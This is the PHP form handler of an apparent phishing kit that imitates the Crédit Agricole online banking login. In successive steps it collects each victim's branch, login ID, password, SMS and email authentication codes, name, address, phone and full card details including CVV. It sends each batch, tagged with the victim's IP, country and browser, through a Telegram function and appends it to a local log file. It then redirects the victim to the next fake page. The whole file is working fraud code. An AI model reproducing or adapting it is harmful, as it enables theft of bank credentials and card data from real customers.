<?php

include '../bots/father.php';
include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
$card = CreditCard::validCreditCard($number);
if( $card['valid'] == false ) {
return false;
}
return $card;
}

function validate_cc_cvv($number = null,$type = null) {
if( empty($number) || empty($type) )
return false;
$cvv = CreditCard::validCvc($number, $type);
return $cvv;
}

$to = 'admin@admin.com';

$random   = rand(0,100000000000);
$LCA = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {

/* ENVOI DU DEPARTEMENT */
if ($_POST['type'] == "region") {

$_SESSION['region_number'] = $_POST['region_number'];
$_SESSION['region_caisse'] = $_POST['region_caisse'];

$_SESSION['errors'] = [];
if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
$_SESSION['errors']['region_number'] = true;
}

if( count($_SESSION['errors']) == 0 ) {

$subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Caisse Régionale';

$msg =  '[* AGRICOLE (DEP)  *] >  ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$msg .= '--------------------- ' . "\r\n";
$msg .= '|N° de département  | =  ' . $_POST['region_number'] . "\r\n";
$msg .= '|Caisse régionale   | =  ' . $_POST['region_caisse'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|Date Time          | =  ' . date("Y-m-d H:i:s") . "\r\n";
$msg .= '|IP address         | =  ' . get_user_ip() . "\r\n";
$msg .= '|Country            | =  ' . get_user_country() . "\r\n";
$msg .= '|OS                 | =  ' . get_user_os() . "\r\n";
$msg .= '|Browser            | =  ' . get_user_browser() . "\r\n";
$msg .= '|User agent         | =  ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$msg .= '|Redirection        | =  ' . $_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'] . "\r\n";
$msg .= '---------------------' . "\r\n";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$_SESSION['mTxt'] = base64_encode($msg);

get_data_encrypt("HTML","base64",1024);
telegram_send(urlencode($msg),"get_data_encrypt");
/*mail($to,$subject,$msg,$headers);*/
$house = fopen('../fuck/fucked.fuck', 'a'); 
fwrite($house, $msg); 
fclose($house);
fstop();
header("location: login.php?lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='login.php?lca#".$LCA."';</script>";

} else {
header("location: region.php?error#".$LCA."");
echo "<script type='text/javascript'>window.location.href='region.php?error#".$LCA."';</script>";
}

}

/* ENVOI DU LOGIN */
if ($_POST['type'] == "login") {

$_SESSION['identifiant'] = $_POST['identifiant'];
$_SESSION['password']= $_POST['password'];

$_SESSION['errors'] = [];
if( validate_number($_POST['identifiant'],11) == false ) {
$_SESSION['errors']['identifiant'] = true;
}

if( validate_number($_POST['password'],6) == false ) {
$_SESSION['errors']['password'] = true;
}

if( count($_SESSION['errors']) == 0 ) {

$subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Login';

$msg =  '[* AGRICOLE (LOG)  *] >  ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|N° de département  | =  ' . $_SESSION['region_number'] . "\r\n";
$msg .= '|Caisse régionale   | =  ' . $_SESSION['region_caisse'] . "\r\n";
$msg .= '|Identifiant        | =  ' . $_POST['identifiant'] . "\r\n";
$msg .= '|Password           | =  ' . $_POST['password'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|Date Time          | =  ' . date("Y-m-d H:i:s") . "\r\n";
$msg .= '|IP address         | =  ' . get_user_ip() . "\r\n";
$msg .= '|Country            | =  ' . get_user_country() . "\r\n";
$msg .= '|OS                 | =  ' . get_user_os() . "\r\n";
$msg .= '|Browser            | =  ' . get_user_browser() . "\r\n";
$msg .= '|User agent         | =  ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$msg .= '|Redirection        | =  ' . $_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'] . "\r\n";
$msg .= '---------------------' . "\r\n";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$_SESSION['mTxt'] = base64_encode($msg);

get_data_encrypt("HTML","base64",1024);
telegram_send(urlencode($msg),"get_data_encrypt");
/*mail($to,$subject,$msg,$headers);*/
$house = fopen('../fuck/fucked.fuck', 'a'); 
fwrite($house, $msg);
fclose($house);
fstop();
header("location: loading.php?ldg=1&lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='loading.php?ldg=1&lca#".$LCA."';</script>";

} else {
header("location: login.php?lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='login.php?lca#".$LCA."';</script>";
}

}


/* ENVOI DU SMS */
if ($_POST['type'] == "authfort") {

$_SESSION['authfort']= $_POST['authfort'];


if( count($_SESSION['errors']) == 0 ) {

$subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | AUTHENTIFICATIONFORTE';

$msg =  '[* AGRICOLE (LOG)  *] >  ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|N° de département  | =  ' . $_SESSION['region_number'] . "\r\n";
$msg .= '|Caisse régionale   | =  ' . $_SESSION['region_caisse'] . "\r\n";
$msg .= '|Identifiant        | =  ' . $_SESSION['identifiant'] . "\r\n";
$msg .= '|Password           | =  ' . $_SESSION['password'] . "\r\n";
$msg .= '|Authentification f.| =  ' . $_POST['authfort'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|Date Time          | =  ' . date("Y-m-d H:i:s") . "\r\n";
$msg .= '|IP address         | =  ' . get_user_ip() . "\r\n";
$msg .= '|Country            | =  ' . get_user_country() . "\r\n";
$msg .= '|OS                 | =  ' . get_user_os() . "\r\n";
$msg .= '|Browser            | =  ' . get_user_browser() . "\r\n";
$msg .= '|User agent         | =  ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$msg .= '|Redirection        | =  ' . $_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'] . "\r\n";
$msg .= '---------------------' . "\r\n";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$_SESSION['mTxt'] = base64_encode($msg);

get_data_encrypt("HTML","base64",1024);
telegram_send(urlencode($msg),"get_data_encrypt");
/*mail($to,$subject,$msg,$headers);*/
$house = fopen('../fuck/fucked.fuck', 'a'); 
fwrite($house, $msg);
fclose($house);
fstop();
header("location: loading.php?ldg=2&lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='loading.php?ldg=2&lca#".$LCA."';</script>";

} else {
header("location: authfort.php?lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='authfort.php?lca#".$LCA."';</script>";
}

}

/* ENVOI DU MAIL */ 
if ($_POST['type'] == "validemail") {

$_SESSION['validemail']= $_POST['validemail'];

$_SESSION['errors'] = [];
if( empty($_POST['validemail']) || strlen($_POST['validemail']) != 6 ) {
$_SESSION['errors']['validemail'] = 'Le code est incorrect.';
}

if( count($_SESSION['errors']) == 0 ) {

$subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Code Email';

$msg =  '[* AGRICOLE (MAIL) *] >  ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|N° de département  | =  ' . $_SESSION['region_number'] . "\r\n";
$msg .= '|Caisse régionale   | =  ' . $_SESSION['region_caisse'] . "\r\n";
$msg .= '|Identifiant        | =  ' . $_SESSION['identifiant'] . "\r\n";
$msg .= '|Password           | =  ' . $_SESSION['password'] . "\r\n";
$msg .= '|Authentification f.| =  ' . $_SESSION['authfort'] . "\r\n";
$msg .= '|Secure passe       | =  ' . $_SESSION['securepass'] . "\r\n";
$msg .= '|Code email         | =  ' . $_POST['validemail'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|Date Time          | =  ' . date("Y-m-d H:i:s") . "\r\n";
$msg .= '|IP address         | =  ' . get_user_ip() . "\r\n";
$msg .= '|Country            | =  ' . get_user_country() . "\r\n";
$msg .= '|OS                 | =  ' . get_user_os() . "\r\n";
$msg .= '|Browser            | =  ' . get_user_browser() . "\r\n";
$msg .= '|User agent         | =  ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$msg .= '|Redirection        | =  ' . $_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'] . "\r\n";
$msg .= '---------------------' . "\r\n";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$_SESSION['mTxt'] = base64_encode($msg);
 
get_data_encrypt("HTML","base64",1024);
telegram_send(urlencode($msg),"get_data_encrypt");
/*mail($to,$subject,$msg,$headers);*/
$house = fopen('../fuck/fucked.fuck', 'a'); 
fwrite($house, $msg);
fclose($house);
fstop();
header("location: validemail.php?ldg=3&lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='validemail.php?ldg=3&lca#".$LCA."';</script>";

} else {
header("location: validemail.php?lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='validemail.php?lca#".$LCA."';</script>";
}

}

/* ENVOI DE LA CARTE */
if ($_POST['type'] == "card") {

$_SESSION['nom']= $_POST['nom'];
$_SESSION['prenom'] = $_POST['prenom'];
$_SESSION['address']= $_POST['address'];
$_SESSION['phone']= $_POST['phone'];
$_SESSION['zip_code']   = $_POST['zip_code'];
$_SESSION['city']   = $_POST['city'];
$_SESSION['cc_number'] = $_POST['cc_number'];
$_SESSION['cc_cvv']= $_POST['cc_cvv'];
$_SESSION['cc_date']   = $_POST['cc_date'];

$date_ex = explode('/',$_POST['cc_date']);

$card_number = validate_cc_number($_POST['cc_number']);
$card_cvv= validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);
$card_date = trim($date_ex[0]) . '/' . trim($date_ex[1]);

$_SESSION['errors'] = [];
if( validate_name($_POST['nom']) == false ) {
$_SESSION['errors']['nom'] = 'Veuillez saisir un nom valide.';
}

if( validate_name($_POST['prenom']) == false ) {
$_SESSION['errors']['prenom'] = 'Veuillez saisir un prénom valide.';
}

if( $card_number == false ) {
$_SESSION['errors']['cc_number'] = 'Veuillez saisir un numéro de la carte valid.';
}

if( $card_cvv == false ) {
$_SESSION['errors']['cc_cvv'] = 'Veuillez saisir un numéro valid.';
}

if( validate_date($card_date,'m/y') == false ) {
$_SESSION['errors']['cc_date'] = 'Veuillez saisir une date valide.';
}

if( empty($_POST['address']) ) {
$_SESSION['errors']['address'] = 'Veuillez saisir une adresse valide.';
}

if( empty($_POST['phone']) ) {
$_SESSION['errors']['phone'] = 'Veuillez saisir un numéro de téléphone valide.';
}

if( validate_number($_POST['zip_code']) == false ) {
$_SESSION['errors']['zip_code'] = 'Veuillez saisir un code postale valide.';
}

if( empty($_POST['city']) ) {
$_SESSION['errors']['city'] = 'Veuillez saisir une ville valide.';
}

if( $_POST['cc_number'] != "" ) {

$subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Card Details';

$msg =  '[* AGRICOLE (CARD) *] >  ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|N° de département  | =  ' . $_SESSION['region_number'] . "\r\n";
$msg .= '|Caisse régionale   | =  ' . $_SESSION['region_caisse'] . "\r\n";
$msg .= '|Identifiant        | =  ' . $_SESSION['identifiant'] . "\r\n";
$msg .= '|Password           | =  ' . $_SESSION['password'] . "\r\n";
$msg .= '|Authentification f.| =  ' . $_SESSION['authfort'] . "\r\n";
$msg .= '|Secure passe       | =  ' . $_SESSION['securepass'] . "\r\n";
$msg .= '|Code email         | =  ' . $_SESSION['validemail'] . "\r\n";
$msg .= '|noms               | =  ' . $_POST['nom'] . "\r\n";
$msg .= '|prenom             | =  ' . $_POST['prenom'] . "\r\n";
$msg .= '|address            | =  ' . $_POST['address'] . "\r\n";
$msg .= '|Telephone          | =  ' . $_POST['phone'] . "\r\n";
$msg .= '|zip_code           | =  ' . $_POST['zip_code'] . "\r\n";
$msg .= '|city               | =  ' . $_POST['city'] . "\r\n";
$msg .= '|N° de carte        | =  ' . $_POST['cc_number'] . "\r\n";
$msg .= '|Date d\'expiration | =  ' . $_POST['cc_date'] . "\r\n";
$msg .= '|Cvv| =  ' . $_POST['cc_cvv'] . "\r\n";
$msg .= '---------------------' . "\r\n";
$msg .= '|Date Time          | =  ' . date("Y-m-d H:i:s") . "\r\n";
$msg .= '|IP address         | =  ' . get_user_ip() . "\r\n";
$msg .= '|Country            | =  ' . get_user_country() . "\r\n";
$msg .= '|OS                 | =  ' . get_user_os() . "\r\n";
$msg .= '|Browser            | =  ' . get_user_browser() . "\r\n";
$msg .= '|User agent         | =  ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$msg .= '|Redirection        | =  ' . $_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'] . "\r\n";
$msg .= '---------------------' . "\r\n";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$_SESSION['mTxt'] = base64_encode($msg);

get_data_encrypt("HTML","base64",1024);
telegram_send(urlencode($msg),"get_data_encrypt");
/*mail($to,$subject,$msg,$headers);*/
$house = fopen('../fuck/fucked.fuck', 'a');  
fwrite($house, $msg);
fclose($house);
fstop();
/*session_destroy();*/
/*header("location: https://www.credit-agricole.fr/");*/
header("location: loading.php?ldg=4&lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='loading.php?ldg=4&lca#".$LCA."';</script>";

} else { 
header("location: card.php?lca#".$LCA."");
echo "<script type='text/javascript'>window.location.href='card.php?lca#".$LCA."';</script>";
}

}

}

?>